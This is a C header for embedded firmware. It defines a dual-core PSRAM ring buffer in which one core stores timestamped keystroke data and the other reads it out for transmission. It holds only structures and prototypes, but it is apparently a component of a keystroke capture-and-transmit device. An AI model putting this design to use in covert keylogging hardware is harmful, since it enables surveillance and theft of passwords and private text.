#ifndef PSRAM_BUFFER_H
#define PSRAM_BUFFER_H

#include <stdint.h>
#include <stdbool.h>

#ifdef __cplusplus
extern "C" {
#endif

#define PSRAM_BUFFER_SLOTS 8
#define PSRAM_BUFFER_DATA_SIZE 504
#define PSRAM_MAGIC 0xC0DE8001

/**
 * Buffer header (32 bytes, shared between cores)
 * Contains metadata for ring buffer management
 */
typedef struct {
    uint32_t magic;                    // Validation magic number
    volatile uint32_t write_index;     // Core1 writes (0-7)
    volatile uint32_t read_index;      // Core0 reads (0-7)
    volatile uint32_t buffer_count;    // Available buffers for transmission
    uint32_t total_written;            // Total buffers written by Core1
    uint32_t total_transmitted;        // Total buffers transmitted by Core0
    uint32_t dropped_buffers;          // Buffers dropped due to overflow
    uint32_t reserved;                 // Reserved for future use
} psram_buffer_header_t;

/**
 * Individual buffer slot (512 bytes)
 * Contains keystroke data with timestamps
 * Note: Timestamps are uptime in seconds (millis()/1000), not unix epoch
 */
typedef struct {
    uint32_t start_epoch;              // Buffer start timestamp (seconds since boot)
    uint32_t final_epoch;              // Buffer finalize timestamp (seconds since boot)
    uint16_t data_length;              // Actual data length in bytes
    uint16_t flags;                    // Reserved for future flags
    char data[PSRAM_BUFFER_DATA_SIZE]; // Keystroke data (504 bytes)
} psram_keystroke_buffer_t;

/**
 * Complete PSRAM structure
 * Header + 8 buffer slots = 32 + (8 * 512) = 4128 bytes total
 */
typedef struct {
    psram_buffer_header_t header;
    psram_keystroke_buffer_t slots[PSRAM_BUFFER_SLOTS];
} psram_buffer_t;

// Global instance (in RAM for now, FRAM later)
extern psram_buffer_t g_psram_buffer;

/**
 * Initialize PSRAM buffer system
 * Must be called once during system initialization
 */
void psram_buffer_init();

/**
 * Write buffer to PSRAM (Core1 operation)
 * @param buffer Pointer to keystroke buffer to write
 * @return true if written successfully, false if buffer full
 */
bool psram_buffer_write(const psram_keystroke_buffer_t *buffer);

/**
 * Check if PSRAM has data available (Core0 operation)
 * @return true if data available for transmission
 */
bool psram_buffer_has_data();

/**
 * Read buffer from PSRAM (Core0 operation)
 * @param buffer Output buffer to receive data
 * @return true if buffer read successfully, false if empty
 */
bool psram_buffer_read(psram_keystroke_buffer_t *buffer);

/**
 * Get number of buffers available for transmission
 * @return Number of buffers ready to transmit
 */
uint32_t psram_buffer_get_count();

#ifdef __cplusplus
}
#endif

#endif // PSRAM_BUFFER_H
